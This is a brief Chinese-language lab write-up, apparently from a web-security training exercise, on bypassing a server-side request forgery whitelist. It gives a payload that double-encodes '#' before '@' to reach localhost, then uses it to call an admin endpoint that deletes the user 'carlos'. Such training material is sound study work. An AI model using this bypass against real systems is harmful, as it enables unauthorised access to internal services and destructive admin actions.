ssrf访问：http://localhost

报错并，提示只能访问stock.weliketoshop.net



此时尝试绕过该白名单限制：

最终看了wp才发现绕过方式：

```javascript
http://localhost%2523@stock.weliketoshop.net
```

@前面的url编码时二次编码的#



访问：

```javascript
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

